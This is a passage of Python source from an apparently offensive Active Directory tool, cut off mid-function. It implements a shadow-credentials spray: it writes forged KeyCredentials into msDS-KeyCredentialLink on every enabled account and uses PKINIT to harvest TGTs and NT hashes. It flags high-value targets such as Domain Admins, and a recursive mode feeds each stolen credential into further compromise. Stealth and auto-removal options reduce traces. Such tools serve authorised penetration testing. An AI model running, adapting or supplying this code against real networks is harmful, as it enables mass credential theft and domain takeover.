                            new_values.append(dn_binary_value)
                            continue
                        
                        if keyCredential.DeviceId.toFormatD() == device_id:
                            device_id_found = True
                            # Don't add this one (removing it)
                        else:
                            new_values.append(dn_binary_value)
                    except Exception as err:
                        # Keep credentials we can't parse
                        new_values.append(dn_binary_value)
                
                if device_id_found:
                    # Update the attribute
                    ldap_sess.modify(
                        target_dn,
                        {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]}
                    )
                    
                    if ldap_sess.result['result'] == 0:
                        write_func(Colors.success(f"[+] Successfully removed credential (DeviceID: {device_id}) from {username}"))
                        log_device_id('REMOVE', username, device_id, output_directory, success=True)
                        return True
                    else:
                        if debug:
                            error_msg = ldap_sess.result.get('message', 'Unknown error')
                            write_func(Colors.error(f"[-] Failed to remove credential: {error_msg}"))
                        log_device_id('REMOVE', username, device_id, output_directory, success=False)
                        return False
                else:
                    if debug:
                        write_func(f"[!] DeviceID {device_id} not found for {username} (may have been removed already)")
                    log_device_id('REMOVE', username, device_id, output_directory, success=False)
                    return False
                    
            except Exception as e:
                if debug:
                    write_func(f"[-] Error removing credential: {e}")
                log_device_id('REMOVE', username, device_id, output_directory, success=False)
                return False
        
        # Helper function to perform spray on accounts
        def perform_spray(ldap_sess, search_base_val, excluded_users_list=None, output_directory='', current_user=None, current_hash=None, already_compromised=None, auto_remove=True, pre_queried_accounts=None, stealth_mode=False):
            """Perform spray attack on all accounts
            
            Args:
                pre_queried_accounts: Optional list of pre-queried account dictionaries.
                                     If provided, skips LDAP query and uses this list instead.
            """
            if already_compromised is None:
                already_compromised = set()
            
            # Use pre-queried accounts if provided, otherwise query LDAP
            domain_admins_set_from_query = set()
            domain_controllers_set_from_query = set()
            
            if pre_queried_accounts is not None:
                # pre_queried_accounts can be either a list or a tuple (accounts, da_set, dc_set)
                if isinstance(pre_queried_accounts, tuple) and len(pre_queried_accounts) == 3:
                    accounts_to_spray, domain_admins_set_from_query, domain_controllers_set_from_query = pre_queried_accounts
                else:
                    accounts_to_spray = pre_queried_accounts
                # Don't print debug output when using pre-queried accounts (already printed once at beginning)
            else:
                # Query for both users and computers (only happens if pre_queried_accounts not provided)
                try:
                    accounts_to_spray, domain_admins_set_from_query, domain_controllers_set_from_query = query_all_accounts(ldap_sess, search_base_val, None)
                    print(f"[+] Found {len(accounts_to_spray)} enabled account(s) to spray")
                    if domain_admins_set_from_query:
                        print(f"[+] Found {len(domain_admins_set_from_query)} Domain Admin(s)/Enterprise Admin(s)")
                    if domain_controllers_set_from_query:
                        print(f"[+] Found {len(domain_controllers_set_from_query)} Domain Controller(s)")
                except Exception as e:
                    if debug:
                        import traceback
                        traceback.print_exc()
                    print(Colors.error(f"[-] Error querying LDAP: {e}"))
                    return []
            
            if not accounts_to_spray:
                if debug:
                    print("[!] No users or computers found")
                return []
            
            successful_targets = []
            
            # Filter out already compromised accounts before creating progress bar
            filtered_accounts = [acc for acc in accounts_to_spray if acc['sAMAccountName'] not in already_compromised]
            total_accounts = len(filtered_accounts)
            
            if total_accounts == 0:
                if debug:
                    print("[!] No new accounts to spray (all already compromised)")
                return []
            
            try:
                # Create progress bar
                progress_bar = tqdm(
                    filtered_accounts,
                    desc="Spraying accounts",
                    unit="account",
                    bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{percentage:3.0f}%] {elapsed}',
                    disable=False,
                    file=sys.stdout
                )
                
                for account_info in progress_bar:
                    sam = account_info['sAMAccountName']
                    target_dn = account_info['distinguishedName']
                    
                    # Update progress bar description with current user
                    progress_bar.set_description(f"Spraying: {sam}")
                    
                    try:
                        if debug:
                            progress_bar.write(f"\n[*] Attempting shadow credential for: {sam}")
                        
                        # Generate certificate
                        certificate = X509Certificate2(
                            subject=sam,
                            keySize=2048,
                            notBefore=(-40*365),
                            notAfter=(40*365)
                        )
                        
                        # Generate KeyCredential and track DeviceID
                        device_id_guid = Guid()
                        keyCredential = KeyCredential.fromX509Certificate2(
                            certificate=certificate,
                            deviceId=device_id_guid,
                            owner=target_dn,
                            currentTime=DateTime()
                        )
                        device_id_str = keyCredential.DeviceId.toFormatD()  # Store for removal later
                        
                        # Get existing values
                        ldap_sess.search(
                            target_dn,
                            '(objectClass=*)',
                            search_scope=ldap3.BASE,
                            attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink']
                        )
                        
                        results = None
                        for resp_entry in ldap_sess.response:
                            if resp_entry['type'] != 'searchResEntry':
                                continue
                            results = resp_entry
                            break
                        
                        new_keycred_string = keyCredential.toDNWithBinary().toString()
                        
                        if results and 'raw_attributes' in results and 'msDS-KeyCredentialLink' in results['raw_attributes']:
                            existing_values = results['raw_attributes']['msDS-KeyCredentialLink']
                            if not isinstance(existing_values, list):
                                existing_values = [existing_values]
                            new_values = existing_values + [new_keycred_string]
                        else:
                            new_values = [new_keycred_string]
                        
                        # Update the attribute
                        ldap_sess.modify(
                            target_dn,
                            {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]}
                        )
                        
                        if ldap_sess.result['result'] == 0:
                            progress_bar.write(Colors.success(f"[+] Successfully added shadow credential to {sam}"))
                            
                            # Log the addition
                            log_device_id('ADD', sam, device_id_str, output_directory, success=True)
                            
                            # Export certificate and get NT hash
                            spray_cert_base = f"spray_{sam.replace('$', '_')}"
                            if output_directory:
                                spray_cert_path = os.path.join(output_directory, spray_cert_base)
                            else:
                                spray_cert_path = spray_cert_base
                            
                            # Export as PEM first
                            certificate.ExportPEM(path_to_files=spray_cert_path)
                            cert_file = f"{spray_cert_path}_cert.pem"
                            key_file = f"{spray_cert_path}_priv.pem"
                            
                            # Convert to PFX if needed
                            if export_type.upper() == "PFX":
                                # Generate unique password for each account
                                spray_pfx_password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
                            
                                pfx_file = f"{spray_cert_path}.pfx"
                                password_file = f"{spray_cert_path}.password"
                                
                                # Save password to file
                                with open(password_file, 'w') as f:
                                    f.write(spray_pfx_password)
                                
                                export_pfx_with_cryptography(
                                    pem_cert_file=cert_file,
                                    pem_key_file=key_file,
                                    pfx_password=spray_pfx_password,
                                    out_file=pfx_file
                                )
                                
                                # Get TGT and NT hash (skip NT hash if stealth mode)
                                target_domain_used = target_dom if target_dom else domain
                                asrep_key, nt_hash = get_tgt_and_nt_hash(
                                    cert_file=cert_file,
                                    key_file=key_file,
                                    pfx_file=pfx_file,
                                    pfx_password=spray_pfx_password,
                                    domain=target_domain_used,
                                    dc_ip=dc_ip,
                                    target_user=sam,
                                    output_dir=output_directory,
                                    debug=False,  # Less verbose for spray
                                    stealth=stealth_mode,
                                    write_func=progress_bar.write
                                )
                                
                                # Check if this account is valuable
                                is_valuable = account_info.get('isValuable', False)
                                valuable_reason = account_info.get('valuableReason', '')
                                
                                # Build valuable flag with yellow color
                                if is_valuable:
                                    valuable_flag = f" {Colors.YELLOW}[VALUABLE]{Colors.RESET}"
                                    valuable_info = f" ({valuable_reason})" if valuable_reason else ""
                                else:
                                    valuable_flag = ""
                                    valuable_info = ""
                                
                                if stealth_mode:
                                    # In stealth mode, success means we got the TGT/ccache (nt_hash will be None)
                                    progress_bar.write(Colors.success(f"[+] {sam}: TGT/ccache obtained (stealth mode){valuable_flag}{valuable_info}"))
                                    successful_targets.append((sam, None, is_valuable, valuable_reason))
                                elif nt_hash:
                                    progress_bar.write(Colors.success(f"[+] {sam}: {nt_hash}{valuable_flag}{valuable_info}"))
                                    successful_targets.append((sam, nt_hash, is_valuable, valuable_reason))
                                else:
                                    progress_bar.write(Colors.error(f"[!] {sam}: Credential added but could not retrieve NT hash"))
                                    successful_targets.append((sam, None, is_valuable, valuable_reason))
                                
                                # Always remove credential after PKINIT attempt (regardless of success)
                                if auto_remove:
                                    if debug:
                                        progress_bar.write(f"[*] Auto-removing credential (DeviceID: {device_id_str})...")
                                    remove_credential_by_device_id(ldap_sess, target_dn, device_id_str, sam, output_directory, write_func=progress_bar.write)
                            else:
                                # PEM mode
                                target_domain_used = target_dom if target_dom else domain
                                asrep_key, nt_hash = get_tgt_and_nt_hash(
                                    cert_file=cert_file,
                                    key_file=key_file,
                                    pfx_file=None,
                                    pfx_password=None,
                                    domain=target_domain_used,
                                    dc_ip=dc_ip,
                                    target_user=sam,
                                    output_dir=output_directory,
                                    debug=False,
                                    stealth=stealth_mode,
                                    write_func=progress_bar.write
                                )
                                
                                # Check if this account is valuable
                                is_valuable = account_info.get('isValuable', False)
                                valuable_reason = account_info.get('valuableReason', '')
                                
                                if stealth_mode:
                                    # In stealth mode, success means we got the TGT/ccache (nt_hash will be None)
                                    valuable_flag = f" {Colors.YELLOW}[VALUABLE]{Colors.RESET}" if is_valuable else ""
                                    valuable_info = f" ({valuable_reason})" if valuable_reason else ""
                                    progress_bar.write(Colors.success(f"[+] {sam}: TGT/ccache obtained (stealth mode){valuable_flag}{valuable_info}"))
                                    successful_targets.append((sam, None, is_valuable, valuable_reason))
                                elif nt_hash:
                                    valuable_flag = f" {Colors.YELLOW}[VALUABLE]{Colors.RESET}" if is_valuable else ""
                                    valuable_info = f" ({valuable_reason})" if valuable_reason else ""
                                    progress_bar.write(Colors.success(f"[+] {sam}: {nt_hash}{valuable_flag}{valuable_info}"))
                                    successful_targets.append((sam, nt_hash, is_valuable, valuable_reason))
                                else:
                                    progress_bar.write(Colors.error(f"[!] {sam}: Credential added but could not retrieve NT hash"))
                                    successful_targets.append((sam, None, is_valuable, valuable_reason))
                                
                                # Always remove credential after PKINIT attempt (regardless of success)
                                if auto_remove:
                                    if debug:
                                        progress_bar.write(f"[*] Auto-removing credential (DeviceID: {device_id_str})...")
                                    remove_credential_by_device_id(ldap_sess, target_dn, device_id_str, sam, output_directory, write_func=progress_bar.write)
                        else:
                            if debug:
                                error_msg = ldap_sess.result.get('message', 'Unknown error')
                                progress_bar.write(Colors.error(f"[-] Failed to add credential to {sam}: {error_msg}"))
                    
                    except Exception as e:
                        if debug:
                            progress_bar.write(f"[-] Error processing {sam}: {e}")
                        continue
                
                # Close progress bar cleanly
                progress_bar.close()
                # Add a newline after progress bar closes to ensure clean output
                print()
            except Exception:
                pass  # Handle any exceptions during progress bar cleanup
            
            return successful_targets
        
        # Handle spray mode
        if spray:
            if not DSINTERNALS_AVAILABLE:
                print("[-] Error: dsinternals library is required for shadow credentials")
                print("[-] Install it with: pip install dsinternals")
                sys.exit(1)
            
            # Handle user-pass file
            credentials_to_use = []
            if user_pass_file:
                if not os.path.exists(user_pass_file):
                    print(f"[-] User-pass file not found: {user_pass_file}")
                    sys.exit(1)
                
                with open(user_pass_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith('#'):
                            continue
                        if ':' in line:
                            user, pwd = line.split(':', 1)
                            credentials_to_use.append((user.strip(), pwd.strip()))
                
                if not credentials_to_use:
                    print(f"[-] No valid credentials found in {user_pass_file}")
                    sys.exit(1)
                
                print(f"[+] Loaded {len(credentials_to_use)} credential(s) from {user_pass_file}")
            else:
                # Use current credentials
                if username and password:
                    credentials_to_use = [(username, password)]
                elif username and nthash:
                    # Hash authentication - use NT hash as the "password" for recursive mode
                    credentials_to_use = [(username, nthash)]
                    if debug:
                        print(f"[*] Using hash authentication for recursive mode: {username}")
                elif kerberos and recursive:
                    # For recursive Kerberos mode, try to get username from ccache file
                    ccache_file_to_use = ccache or os.getenv('KRB5CCNAME')
                    if ccache_file_to_use and os.path.exists(ccache_file_to_use):
                        try:
                            from impacket.krb5.ccache import CCache
                            ccache_obj = CCache.loadFile(ccache_file_to_use)
                            if ccache_obj and len(ccache_obj.principal.components) > 0:
                                ccache_username = ccache_obj.principal.components[0]['data'].decode('utf-8')
                                # Use ccache file as "password" marker for recursive mode
                                credentials_to_use = [(ccache_username, 'CCACHE')]
                                if debug:
                                    print(f"[*] Extracted username '{ccache_username}' from ccache file for recursive operations")
                        except Exception as e:
                            if debug:
                                print(f"[*] Could not extract username from ccache: {e}")
                            credentials_to_use = []
                    else:
                        credentials_to_use = []
                else:
                    credentials_to_use = []
            
            all_compromised = []  # Track all compromised accounts across iterations
            
            # If we have all credentials from user-pass file, query LDAP once at the beginning
            pre_queried_accounts = None
            if user_pass_file and credentials_to_use:
                print(f"[*] Querying LDAP once for all accounts (using first credential from file)...")
                # Use the first credential to query LDAP
                first_user, first_pass = credentials_to_use[0]
                
                try:
                    # Authenticate with first credential (only use kerberos if -k flag specified)
                    if is_nt_hash(first_pass):
                        query_ldap_server, query_ldap_session = init_ldap_session(
                            domain, first_user, None, dc_ip, ldaps, nt_hash=first_pass.strip(),
                            kerberos=kerberos, lmhash=lmhash, nthash=first_pass.strip() if is_nt_hash(first_pass) else None,
                            ccache_file=ccache if kerberos else None
                        )
                    else:
                        query_ldap_server, query_ldap_session = init_ldap_session(
                            domain, first_user, first_pass, dc_ip, ldaps,
                            kerberos=kerberos, lmhash=lmhash, nthash=nthash,
                            ccache_file=ccache if kerberos else None
                        )
                    
                    print(Colors.success(f"[+] Successfully authenticated as {first_user} for LDAP query"))
                    
                    # Query all accounts once (includes Domain Admins and Domain Controllers info)
                    accounts_list, domain_admins_set, domain_controllers_set = query_all_accounts(query_ldap_session, search_base, None)
                    pre_queried_accounts = (accounts_list, domain_admins_set, domain_controllers_set)
                    print(f"[+] Queried {len(accounts_list)} enabled account(s) - will reuse this list for all iterations")
                    if domain_admins_set:
                        print(f"[+] Found {len(domain_admins_set)} Domain Admin(s)/Enterprise Admin(s)")
                    if domain_controllers_set:
                        print(f"[+] Found {len(domain_controllers_set)} Domain Controller(s)")
                    
                    query_ldap_session.unbind()
                except Exception as e:
                    import traceback
                    print(Colors.error(f"[-] Failed to query LDAP with first credential: {e}"))
                    if debug:
                        traceback.print_exc()
                    print(f"[*] Will query LDAP per iteration instead")
                    pre_queried_accounts = None
            
            # Recursive mode
            if recursive:
                print(f"[*] Starting RECURSIVE shadow credentials spray attack...")
                print(f"[*] Press Ctrl+C to stop")
                
                iteration = 0
                current_creds = credentials_to_use.copy()
                all_used_accounts = set()  # Track ALL accounts we've ever used for authentication (to avoid infinite loops)
                compromised_accounts = set()  # Track accounts we've already compromised
                
                # Query LDAP once at the beginning of recursive mode (if not already done)
                domain_admins_set = set()
                domain_controllers_set_from_recursive = set()
                if pre_queried_accounts and isinstance(pre_queried_accounts, tuple) and len(pre_queried_accounts) == 3:
                    # Use pre-queried accounts from user-pass file
                    _, domain_admins_set, domain_controllers_set_from_recursive = pre_queried_accounts
                    if domain_admins_set:
                        print(f"[+] Using Domain Admins set from pre-query ({len(domain_admins_set)} members) - will not add to recursive queue")
                elif ldap_session:
                    # Query LDAP once using initial session
                    print(f"[*] Querying LDAP once for all accounts (using initial session)...")
                    try:
                        accounts_list_recursive, domain_admins_set, domain_controllers_set_from_recursive = query_all_accounts(ldap_session, search_base, None)
                        pre_queried_accounts = (accounts_list_recursive, domain_admins_set, domain_controllers_set_from_recursive)
                        print(f"[+] Queried {len(accounts_list_recursive)} enabled account(s) - will reuse this list for all iterations")
                        if domain_admins_set:
                            print(f"[+] Found {len(domain_admins_set)} Domain Admin(s)/Enterprise Admin(s)")
                        if domain_controllers_set_from_recursive:
                            print(f"[+] Found {len(domain_controllers_set_from_recursive)} Domain Controller(s)")
                    except Exception as e:
                        print(Colors.error(f"[-] Failed to query LDAP: {e}"))
                        if debug:
                            import traceback
                            traceback.print_exc()
                        pre_queried_accounts = None
                
                # Add all accounts from credentials file to compromised list (we already have their credentials)
                for cred_user, _ in credentials_to_use:
                    # Add both with and without $ to handle computer accounts
                    compromised_accounts.add(cred_user)
                    if not cred_user.endswith('$'):
                        compromised_accounts.add(cred_user + '$')  # Also add with $ for computer accounts
                    if debug:
                        print(f"[*] Adding {cred_user} to compromised list (already have credentials)")
                
                if credentials_to_use:
                    print(f"[+] Marked {len(credentials_to_use)} account(s) from credentials file as already compromised (skipping spray)")
                
                try:
                    while True:
                        iteration += 1
                        print(f"\n{'='*60}")
                        print(f"[*] Iteration {iteration}")
                        print(f"{'='*60}")
                        
                        if not current_creds:
                            print("[!] No more credentials to use. Stopping.")
                            break
                        
                        print(f"[*] Using {len(current_creds)} credential(s) in this iteration:")
                        for u, _ in current_creds:
                            print(f"    - {u}")
                        
                        new_creds_this_iteration = []
                        used_this_iteration = set()  # Track accounts used in THIS iteration only
                        
                        for cred_user, cred_pass in current_creds:
                            # Skip if we've already used this account in this iteration
                            if cred_user in used_this_iteration:
                                if debug:
                                    print(f"[*] Skipping {cred_user} - already used in this iteration")
                                continue
                            
                            print(f"\n[*] Using credentials: {cred_user}")
                            
                            # Mark as used in this iteration
                            used_this_iteration.add(cred_user)
                            all_used_accounts.add(cred_user)
                            
                            # Authenticate with these credentials
                            try:
                                # Check if we have a ccache file for this user (from previous PKINIT or initial auth)
                                user_ccache = None
                                
                                # First check if this is the initial ccache (from KRB5CCNAME or --ccache)
                                if cred_pass == 'CCACHE':
                                    if iteration == 1:
                                        # First iteration - use initial ccache
                                        user_ccache = ccache or os.getenv('KRB5CCNAME')
                                        if user_ccache and os.path.exists(user_ccache):
                                            if debug:
                                                print(f"[*] Using initial ccache file for {cred_user}: {user_ccache}")
                                    elif recursive and output_dir:
                                        # Subsequent iterations - use ccache from previous PKINIT
                                        potential_ccache = os.path.join(output_dir, f"{cred_user}.ccache")
                                        if os.path.exists(potential_ccache):
                                            user_ccache = potential_ccache
                                            if debug:
                                                print(f"[*] Found existing ccache file for {cred_user}: {user_ccache}")
                                elif recursive and output_dir:
                                    # Normal mode (not stealth) - check for ccache file from previous operations
                                    potential_ccache = os.path.join(output_dir, f"{cred_user}.ccache")
                                    if os.path.exists(potential_ccache):
                                        user_ccache = potential_ccache
                                        if debug:
                                            print(f"[*] Found existing ccache file for {cred_user}: {user_ccache}")
                                
                                # Detect credential type and use appropriate auth method
                                if cred_pass == 'CCACHE':
                                    # This is a ccache file marker from stealth mode recursive operations
                                    # Must use Kerberos when using ccache files
                                    if user_ccache and os.path.exists(user_ccache):
                                        cred_ldap_server, cred_ldap_session = init_ldap_session(
                                            domain, cred_user, None, dc_ip, ldaps,
                                            kerberos=True, ccache_file=user_ccache
                                        )
                                    else:
                                        print(Colors.error(f"[-] Ccache file not found for {cred_user}: {user_ccache}"))
                                        continue
                                elif is_nt_hash(cred_pass):
                                    # It's an NT hash - use hash authentication (only kerberos if -k flag specified)
                                    cred_ldap_server, cred_ldap_session = init_ldap_session(
                                        domain, cred_user, None, dc_ip, ldaps, nt_hash=cred_pass.strip(),
                                        kerberos=kerberos, lmhash=lmhash, nthash=cred_pass.strip() if is_nt_hash(cred_pass) else None,
                                        ccache_file=user_ccache or (ccache if kerberos else None)
                                    )
                                else:
                                    # Regular password (only kerberos if -k flag specified)
                                    cred_ldap_server, cred_ldap_session = init_ldap_session(
                                        domain, cred_user, cred_pass, dc_ip, ldaps,
                                        kerberos=kerberos, lmhash=lmhash, nthash=nthash,
                                        ccache_file=user_ccache or (ccache if kerberos else None)
                                    )
                                
                                print(Colors.success(f"[+] Successfully authenticated as {cred_user}"))
                                
                                # Perform spray with these credentials (use pre-queried accounts to avoid re-querying)
                                successful = perform_spray(
                                    cred_ldap_session,
                                    search_base,
                                    None,
                                    output_directory=output_dir,
                                    current_user=cred_user,
                                    current_hash=cred_pass,
                                    already_compromised=compromised_accounts,
                                    auto_remove=not no_autoremove,
                                    pre_queried_accounts=pre_queried_accounts,  # Pass pre-queried accounts to avoid re-querying
                                    stealth_mode=stealth
                                )
                                
                                # Add successful compromises to our list
                                # In stealth mode, add accounts with ccache files; otherwise require NT hashes
                                # successful is now (sam, nt_hash, is_valuable, valuable_reason)
                                for result in successful:
                                    if len(result) >= 2:
                                        sam = result[0]
                                        nt_hash = result[1] if len(result) > 1 else None
                                        is_valuable = result[2] if len(result) > 2 else False
                                        valuable_reason = result[3] if len(result) > 3 else ''
                                    else:
                                        # Fallback for old format
                                        sam, nt_hash = result[0], result[1] if len(result) > 1 else None
                                        is_valuable = False
                                        valuable_reason = ''
                                    is_new_compromise = sam not in compromised_accounts
                                    
                                    # Check if we have a valid credential (NT hash or ccache file in stealth mode)
                                    has_credential = False
                                    if stealth:
                                        # In stealth mode, check for ccache file
                                        potential_ccache = os.path.join(output_dir, f"{sam}.ccache")
                                        has_credential = os.path.exists(potential_ccache)
                                        if not has_credential:
                                            if debug:
                                                print(f"[*] Skipping {sam} - no ccache file found (not adding to queue)")
                                            continue
                                    else:
                                        # In normal mode, require NT hash
                                        has_credential = nt_hash and nt_hash.strip()
                                        if not has_credential:
                                            if debug:
                                                print(f"[*] Skipping {sam} - no valid NT hash retrieved (not adding to queue)")
                                            continue
                                    
                                    # Add to compromised list
                                    if is_new_compromise:
                                        all_compromised.append((sam, nt_hash, is_valuable, valuable_reason))
                                        compromised_accounts.add(sam)
                                    
                                    # Skip if this account was already compromised in a previous iteration
                                    if not is_new_compromise:
                                        if debug:
                                            print(f"[*] Skipping {sam} - already compromised in a previous iteration")
                                        continue
                                    
                                    # Skip Domain Admins - we'll compromise them but not add them to the queue for next iteration
                                    # Use pre-queried set instead of querying LDAP for every account
                                    if sam in domain_admins_set:
                                        if debug:
                                            print(f"[*] Skipping {sam} - Domain Admin (will not add to queue for next iteration)")
                                        continue
                                    
                                    # Skip if already added to this iteration's queue
                                    already_added = any(u == sam for u, _ in new_creds_this_iteration)
                                    if not already_added:
                                        # Add it - use 'CCACHE' as marker for stealth mode, or NT hash for normal mode
                                        cred_value = 'CCACHE' if stealth else nt_hash
                                        new_creds_this_iteration.append((sam, cred_value))
                                        
                                        # Check if valuable and add yellow flag
                                        is_valuable_iter = result[2] if len(result) > 2 else False
                                        valuable_reason_iter = result[3] if len(result) > 3 else ''
                                        valuable_flag_iter = f" {Colors.YELLOW}[VALUABLE]{Colors.RESET}" if is_valuable_iter else ""
                                        valuable_info_iter = f" ({valuable_reason_iter})" if valuable_reason_iter else ""
                                        
                                        if stealth:
                                            print(Colors.success(f"[+] Added {sam} (ccache file) to credentials list for next iteration{valuable_flag_iter}{valuable_info_iter}"))
                                        else:
                                            print(Colors.success(f"[+] Added {sam} to credentials list for next iteration{valuable_flag_iter}{valuable_info_iter}"))
                                    elif debug:
                                        print(f"[*] {sam} already in credentials list for next iteration")
                                
                                try:
                                    cred_ldap_session.unbind()
                                except Exception as unbind_err:
                                    # Silently handle unbind errors (connection reset, etc.)
                                    if debug:
                                        print(f"[*] Warning: Error during LDAP unbind: {unbind_err}")
                                
                            except Exception as e:
                                if debug:
                                    import traceback
                                    traceback.print_exc()
                                print(Colors.error(f"[-] Failed to authenticate as {cred_user}: {e}"))
                                continue
                        
                        # Update credentials for next iteration
                        if new_creds_this_iteration:
                            print(f"[+] Found {len(new_creds_this_iteration)} new credential(s) for next iteration:")
                            for u, h in new_creds_this_iteration:
                                print(f"    - {u}")
                            current_creds = new_creds_this_iteration
                        else:
                            print("[!] No new credentials obtained this iteration. Stopping.")
                            break
                        
                        # Small delay between iterations
                        import time
                        time.sleep(1)
                
                except KeyboardInterrupt:
                    print(f"\n[!] Interrupted by user (Ctrl+C)")
            
            else:
                # Non-recursive spray
                print(f"[*] Starting shadow credentials spray attack...")
                print(f"[*] This will attempt to add credentials to all users and computers")
                
                # Create set of accounts we already have credentials for (skip spraying against them)
                accounts_with_creds = set()
                for cred_user, _ in credentials_to_use:
                    # Add both with and without $ to handle computer accounts
                    accounts_with_creds.add(cred_user)
                    if not cred_user.endswith('$'):
                        accounts_with_creds.add(cred_user + '$')  # Also add with $ for computer accounts
                
                if credentials_to_use:
                    print(f"[+] Marked {len(credentials_to_use)} account(s) from credentials file as already compromised (skipping spray)")
                
                if user_pass_file:
                    # Use each credential from file
                    for cred_user, cred_pass in credentials_to_use:
                        print(f"\n[*] Using credentials: {cred_user}")
                        try:
                            # Detect if it's a hash and use appropriate auth method
                            # Only use kerberos if -k flag was explicitly provided
                            if is_nt_hash(cred_pass):
                                # It's an NT hash - use hash authentication
                                cred_ldap_server, cred_ldap_session = init_ldap_session(
                                    domain, cred_user, None, dc_ip, ldaps, nt_hash=cred_pass.strip(),
                                    kerberos=kerberos, lmhash=lmhash, nthash=cred_pass.strip() if is_nt_hash(cred_pass) else None,
                                    ccache_file=ccache if kerberos else None
                                )
                            else:
                                # Regular password
                                cred_ldap_server, cred_ldap_session = init_ldap_session(
                                    domain, cred_user, cred_pass, dc_ip, ldaps,
                                    kerberos=kerberos, lmhash=lmhash, nthash=nthash,
                                    ccache_file=ccache if kerberos else None
                                )
                            
                            print(f"[+] Successfully authenticated as {cred_user}")
                            
                            # Track compromised accounts in this spray to avoid re-attempting
                            # Include accounts from credentials file (we already have their credentials)
                            spray_compromised = accounts_with_creds.copy()
                            spray_compromised.update({sam for sam, _ in all_compromised})
                            
                            # Perform spray
                            successful = perform_spray(
                                cred_ldap_session,
                                search_base,
                                None,
                                output_directory=output_dir,
                                already_compromised=spray_compromised,
                                auto_remove=not no_autoremove,
                                pre_queried_accounts=pre_queried_accounts,
                                stealth_mode=stealth
                            )
                            
                            all_compromised.extend(successful)
                            cred_ldap_session.unbind()
                            
                        except Exception as e:
                            if debug:
                                print(Colors.error(f"[-] Failed to authenticate as {cred_user}: {e}"))
                            continue
                else:
                    # Use current session
                    # Mark current user as already compromised (we already have their credentials)
                    current_user_compromised = set()
                    if username:
                        # Add both with and without $ to handle computer accounts
                        current_user_compromised.add(username)
                        if not username.endswith('$'):
                            current_user_compromised.add(username + '$')  # Also add with $ for computer accounts
                        if debug:
                            print(f"[*] Marking current user '{username}' as already compromised (skipping spray)")
                    
                    all_compromised = perform_spray(
                        ldap_session,
                        search_base,
                        None,
                        output_directory=output_dir,
                        already_compromised=current_user_compromised,  # Skip current user
                        auto_remove=not no_autoremove,
                        stealth_mode=stealth
                    )
            
            # Summary
            print(f"\n{'='*60}")
            print(f"[+] Spray complete!")
            if stealth:
                print(Colors.success(f"[+] Successfully obtained TGT/ccache for {len(all_compromised)} account(s) (stealth mode):"))
                for result in all_compromised:
                    # Handle both old format (sam, nt_hash) and new format (sam, nt_hash, is_valuable, valuable_reason)
                    if len(result) >= 2:
                        sam = result[0]
                        is_valuable = result[2] if len(result) > 2 else False
                        valuable_reason = result[3] if len(result) > 3 else ''
                        valuable_flag = f" {Colors.YELLOW}[VALUABLE]{Colors.RESET}" if is_valuable else ""
                        valuable_info = f" ({valuable_reason})" if valuable_reason else ""
                        ccache_file = os.path.join(output_dir, f"{sam}.ccache")
                        if os.path.exists(ccache_file):
                            print(f"  {sam}: {ccache_file}{valuable_flag}{valuable_info}")
                        else:
                            print(f"  {sam}: (TGT obtained, ccache file location unknown){valuable_flag}{valuable_info}")
            else:
                print(Colors.success(f"[+] Successfully compromised {len(all_compromised)} account(s):"))
                for result in all_compromised:
                    # Handle both old format (sam, nt_hash) and new format (sam, nt_hash, is_valuable, valuable_reason)
                    if len(result) >= 2:
                        sam = result[0]
                        nt_hash = result[1] if len(result) > 1 else None
                        is_valuable = result[2] if len(result) > 2 else False
                        valuable_reason = result[3] if len(result) > 3 else ''
                        valuable_flag = f" {Colors.YELLOW}[VALUABLE]{Colors.RESET}" if is_valuable else ""
                        valuable_info = f" ({valuable_reason})" if valuable_reason else ""
                        if nt_hash:
                            print(f"  {sam}: {nt_hash}{valuable_flag}{valuable_info}")
                        else:
                            print(f"  {sam}: (credential added, NT hash retrieval failed){valuable_flag}{valuable_info}")
            
            ldap_session.unbind()
            return
        
        # Handle add shadow credentials to target user
        if target and add:
            if not DSINTERNALS_AVAILABLE:
                print("[-] Error: dsinternals library is required for shadow credentials functionality")
                print("[-] Install it with: pip install dsinternals")
                sys.exit(1)
            
            # Find the target user
            if debug:
                print(f"[*] Searching for target user: {target}")
            
            ldap_session.search(
                search_base,
                f'(sAMAccountName={escape_filter_chars(target)})',
                attributes=['distinguishedName', 'sAMAccountName', 'msDS-KeyCredentialLink']
            )
            
            if not ldap_session.entries:
                print(f"[-] User '{target}' not found in domain")
                sys.exit(1)
            
            target_entry = ldap_session.entries[0]
            target_dn = target_entry.entry_dn
            
            if debug:
                print(f"[+] Found user: {target_dn}")
            
            # Check current count - use response method like PyWhisker to get raw_attributes
            ldap_session.search(
                target_dn,
                '(objectClass=*)',
                search_scope=ldap3.BASE,
                attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink']
            )
            
            current_count = 0
            existing_values = []
            results = None
            
            # Get results from response (like PyWhisker does)
            for entry in ldap_session.response:
                if entry['type'] != 'searchResEntry':
                    continue
                results = entry
                break
            
            if results:
                # Check if attribute exists in raw_attributes
                if 'raw_attributes' in results and 'msDS-KeyCredentialLink' in results['raw_attributes']:
                    raw_attr = results['raw_attributes']['msDS-KeyCredentialLink']
                    if isinstance(raw_attr, list):
                        existing_values = raw_attr
                        current_count = len(raw_attr)
                    elif raw_attr:
                        existing_values = [raw_attr]
                        current_count = 1
            
            print(f"[*] Current msDS-KeyCredentialLink count: {current_count}")
            
            # Generate shadow credential
            if debug:
                print(f"[*] Generating certificate for {target}...")
            
            certificate = X509Certificate2(
                subject=target,
                keySize=2048,
                notBefore=(-40*365),
                notAfter=(40*365)
            )
            
            if debug:
                print(f"[*] Certificate generated:")
                print(f"    Subject: CN={target}")
                print(f"    Key Size: 2048 bits")
                print(f"    Valid for: 40 years")
                print(f"[*] Generating KeyCredential...")
            
            device_id = Guid()
            keyCredential = KeyCredential.fromX509Certificate2(
                certificate=certificate,
                deviceId=device_id,
                owner=target_dn,
                currentTime=DateTime()
            )
            
            if debug:
                print(f"[+] KeyCredential generated:")
                print(f"    DeviceID: {keyCredential.DeviceId.toFormatD()}")
                print(f"    Owner: {target_dn}")
                print(f"    Creation Time: {keyCredential.CreationTime}")
            
            # Build new values list - use existing_values we already populated
            try:
